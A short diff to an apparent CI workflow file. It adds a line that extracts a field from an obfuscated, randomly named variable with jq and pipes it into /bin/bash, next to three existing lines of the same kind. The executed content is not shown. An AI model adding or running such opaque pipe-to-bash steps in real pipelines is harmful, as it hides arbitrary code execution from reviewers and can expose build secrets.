@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$bc64" | jq -r .liva59631 | /bin/bash
           echo $zk05015 | jq -r .u3182 | /bin/bash
           echo $daax2 | jq -r .tx47964 | /bin/bash
+          printf '%s' "$pgi83698" | jq -r .zg8434 | /bin/bash
 
       - name: Persist results
         if: always()
